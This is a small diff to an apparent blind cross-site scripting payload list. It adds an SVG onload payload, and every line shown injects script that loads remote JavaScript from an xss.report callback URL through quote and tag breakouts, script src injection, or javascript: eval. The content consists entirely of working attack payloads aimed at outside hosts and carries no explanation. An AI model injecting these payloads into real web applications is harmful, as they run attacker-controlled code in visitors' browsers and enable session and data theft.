@@ -1,3 +1,4 @@
+<svg/onload=import('//xss.report/c/hnterx')>
 '"><script src=https://xss.report/c/hnterx?1></script>
 ';"</script><script/src=//xss.report/c/hnterx?66></script>
 javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/hnterx?2\';document.body.appendChild(a)')
